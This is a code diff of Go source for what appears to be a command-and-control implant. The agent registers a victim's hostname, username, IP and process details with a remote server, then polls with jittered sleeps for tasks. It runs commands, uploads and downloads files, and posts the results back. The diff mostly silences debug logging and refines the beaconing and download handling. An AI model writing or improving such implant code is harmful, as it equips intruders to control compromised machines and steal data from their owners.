@@ -9,7 +9,7 @@ import (
 	"net/http"
 	"os"
 	"os/user"
-	"log" // only for debugging
+	//"log" // only for debugging
 	"strconv"
 	"strings"
 	"time"
@@ -62,7 +62,7 @@ func registerAgent(url string, magic []byte, agentId string) string{
 		"Hostname": hostname,
 		"Username": currentuser.Username,
 		"Domain": "",
-		"InternalIP": strings.Split(hostInfo.IPs[2], "/")[0],
+		"InternalIP": utils.FindNotLoopback(hostInfo.IPs),
 		"Process Path": procPath,
 		"Process ID": strconv.Itoa(procInfo.PID),
 		"Process Parent ID": strconv.Itoa(procInfo.PPID),
@@ -124,7 +124,11 @@ func checkIn(dat string, checkInType string) string{
 
 	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
-	checkError(err)
+	if os.IsTimeout(err){
+		timeoutCounter += 1
+	} else {
+		timeoutCounter = 0
+	}
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("Content-Length", strconv.Itoa(size))
 
@@ -152,10 +156,8 @@ func validateArgs(cmdArgs []string) bool {
 
 func RunCommand(command string) string {
 	output := ""
-	//fmt.Printf(" [*] Command: ")
-	//fmt.Println([]byte(command))
 	cmdArgs := strings.Fields(command)
-	//fmt.Println([]byte(command))
+	//log.Println([]byte(command))
 
 	if validateArgs(cmdArgs) {
 		switch (utils.Strip(cmdArgs[0])){
@@ -174,11 +176,11 @@ func RunCommand(command string) string {
 			output = functions.Ls(cmdArgs[1])
 		case "upload":
 			params := strings.Split(command[7:], ";")
-			log.Println(params)
+			//log.Println(params)
 			output = functions.Upload(params[0], params[1])
 		case "download":
 			params := strings.Split(command[9:], ";")
-			log.Println(params)
+			//log.Println(params)
 			encDat := functions.Download(params[0])
 			if encDat[0:2] == "[!]"{
 				output = encDat
@@ -222,9 +224,14 @@ func main(){
 	for {
 		command = checkIn("", "gettask")
 		if (len(command) > 4) {
-			//fmt.Println("[*] New Task: " + command)
+			//log.Println("[*] New Task: " + command)
+			//log.Println([]byte(utils.Strip(strings.Fields(command)[0])))
 			out = RunCommand(utils.Strip(command[4:]))
-			checkIn(utils.JsonEscape(out), "commandoutput")
+			if utils.Strip(strings.Fields(command[4:])[0]) == "download"{
+				checkIn(utils.JsonEscape(out), "download")
+			} else {
+				checkIn(utils.JsonEscape(out), "commandoutput")
+			}
 		}
 		r = rand.Intn(jitterRange)
 		time.Sleep((time.Duration(sleepTime) * time.Second) + (time.Duration(r) * time.Microsecond))
